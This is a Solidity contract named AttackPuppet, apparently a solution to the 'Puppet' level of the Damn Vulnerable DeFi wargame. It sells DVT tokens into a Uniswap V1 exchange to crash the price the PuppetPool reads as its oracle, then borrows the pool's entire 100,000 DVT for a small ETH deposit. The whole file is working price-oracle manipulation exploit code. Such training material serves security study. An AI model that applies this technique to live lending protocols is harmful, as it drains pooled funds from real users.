// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "../puppet/PuppetPool.sol";
import "hardhat/console.sol";

interface IUniswapExchangeV1 {
    function tokenToEthTransferInput(
        uint256 tokens_sold,
        uint256 min_eth,
        uint256 deadline,
        address recipient
    ) external returns (uint256);
}

contract AttackPuppet {
    uint256 constant SELL_DVT_AMOUNT = 1000 ether;
    uint256 constant BORROW_DVT_AMOUNT = 100000 ether;

    DamnValuableToken token;
    PuppetPool pool;
    IUniswapExchangeV1 immutable exchange;
    address immutable player;

    constructor(address _token, address _pool, address _exchange) {
        token = DamnValuableToken(_token);
        pool = PuppetPool(_pool);
        exchange = IUniswapExchangeV1(_exchange);
        player = msg.sender;
    }

    function attack() public payable {
        require(msg.sender == player);
        // token.transferFrom(msg.sender, address(this), SELL_DVT_AMOUNT);
        token.approve(address(exchange), SELL_DVT_AMOUNT);
        exchange.tokenToEthTransferInput(
            SELL_DVT_AMOUNT,
            9,
            block.timestamp,
            address(this)
        );

        uint256 price = (address(exchange).balance * (10 ** 18)) /
            token.balanceOf(address(exchange));
        uint256 depositRequired = (BORROW_DVT_AMOUNT * price * 2) / 10 ** 18;

        console.log("contract ETH balance: ", address(this).balance);
        console.log("DVT price: ", price);
        console.log("Deposit Required: ", depositRequired);

        pool.borrow{value: depositRequired}(BORROW_DVT_AMOUNT, player);
    }

    receive() external payable {}
}
